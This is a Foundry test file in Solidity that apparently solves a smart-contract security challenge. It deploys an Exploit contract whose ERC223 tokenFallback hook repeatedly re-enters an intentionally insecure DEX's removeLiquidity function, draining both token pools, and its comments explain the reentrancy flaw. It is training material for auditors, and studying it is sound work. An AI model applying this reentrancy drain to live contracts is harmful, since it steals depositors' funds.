// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

import {SimpleERC223Token} from "../src/tokens/tokenERC223.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";


contract Challenge2Test is Test {
    InsecureDexLP target; 
    IERC20 token0;
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        
        token0 = IERC20(new InSecureumToken(10 ether));
        token1 = IERC20(new SimpleERC223Token(10 ether));
        
        target = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);
        target.addLiquidity(9 ether, 9 ether);

        token0.transfer(player, 1 ether);
        token1.transfer(player, 1 ether);
        vm.stopPrank();

        vm.label(address(target), "DEX");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "SimpleERC223Token");
    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/      

        //============================//

        // The DEX is vulnerable for two reasons:
        // 1. token1 (ERC223) has a custom hook defined that calls a function `tokenFallback` whenever the token is transferred to
        //      another smart contract
        // 2. re-entrancy is possible because the DEX doesn't use modifiers and does not use the 'checks-effects' programming style
        // As a result, we can abuse the hook to do a reentrancy attack on the DEX. To do this we open a position in the DEX on behalf
        // of an exploit contract rather than using our EOA. We need this step so that the hook is triggered (it won't trigger for an EOA).
        // The exploit contract has a malicious `tokenFallback` function that calls removeLiquidity multiple times against the DEX
        // because the DEX transfers tokens to the exploit contract during liquidity removal which in turn triggers the hook.

        Exploit exploit = new Exploit(address(token0), address(token1), address(target), player);
        vm.label(address(exploit), "Exploit");

        // give liquidity to exploit contract
        token0.transfer(address(exploit), 1 ether);
        token1.transfer(address(exploit), 1 ether);

        exploit.approve(); // do ERC20 approval so there no approval/balance issues
        exploit.exploit(); 

        // withdraw funds after exploit
        token0.transferFrom(address(exploit), player, token0.balanceOf(address(exploit)));
        token1.transferFrom(address(exploit), player, token1.balanceOf(address(exploit)));

        vm.stopPrank();

        assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
        assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
        assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
        assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");

    }
}



/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/


contract Exploit {
    IERC20 public token0; // this is insecureumToken
    IERC20 public token1; // this is simpleERC223Token
    InsecureDexLP public dex;
    address player;

    constructor (address _token0, address _token1, address _dex, address _player) {
        player = _player;
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
        dex = InsecureDexLP(_dex);
    }

    function approve() public {
        // Allow full control over this contract's funds
        token0.approve(address(dex), 10 ether);
        token1.approve(address(dex), 10 ether);
        token0.approve(address(player), 10 ether);
        token1.approve(address(player), 10 ether);
    }

    // Call this after transferring funds into the contract
    function exploit() external {
        // Open a position in the DEX on behalf of the contract
        dex.addLiquidity(1 ether, 1 ether);
        // Begin attack. When dex.removeLiquidity calls safeTransfer, the ERC223 function will call tokenFallback in this contract.
        // This allows us to re-enter the removeLiquidity step and drain all funds
        dex.removeLiquidity(1 ether);
    }

    // matching function signature defined in ERC223 contract
    function tokenFallback(address, uint256, bytes memory) external { 
        // End the reentrancy because the DEX is out of money
        if (dex.balanceOf(address(this)) == 0) {
            return;
        }
        // While the DEX has money, call removeLiquidity again so that it transfers more funds to this contract
        if (token0.balanceOf(address(dex)) > 0) {
            dex.removeLiquidity(1 ether);
        }
    }

}
